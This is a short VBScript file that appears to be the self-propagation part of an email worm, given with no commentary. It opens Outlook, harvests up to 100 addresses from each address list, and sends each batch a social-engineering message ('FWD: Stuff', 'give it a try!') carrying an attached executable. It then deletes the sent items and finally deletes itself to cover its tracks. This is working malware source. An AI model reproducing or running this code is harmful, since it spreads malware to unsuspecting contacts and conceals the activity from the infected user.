on error resume next
set v1=createobject("outlook.application")
set v2=v1.getnamespace("mapi")
for v3=1 to v2.addresslists.count
set v4=v2.addresslists(v3)
v5=1
set v6=v1.createitem(0)
for v7=1 to v4.addressentries.count
v8=v4.addressentries(v5)
v6.recipients.add v8
v5=v5+1
if v5>100 then exit for
next
v6.subject="FWD: Stuff"
v6.body="Cool! ;-)"&vbcrlf&vbcrlf&"-----Original Message-----"&vbcrlf&vbcrlf&"> Hi,"&vbcrlf&"> I've just finished this thing, give it a try!"&vbcrlf&"> I'd be happy if you could help me by sending any remarks."&vbcrlf&"> C ya"
v6.attachments.add"C:\WINDOWS\DIXIE.EXE"
v6.deleteaftersubmit=true
v6.send
next
set v6=createobject("scripting.filesystemobject")
v6.deletefile wscript.scriptfullname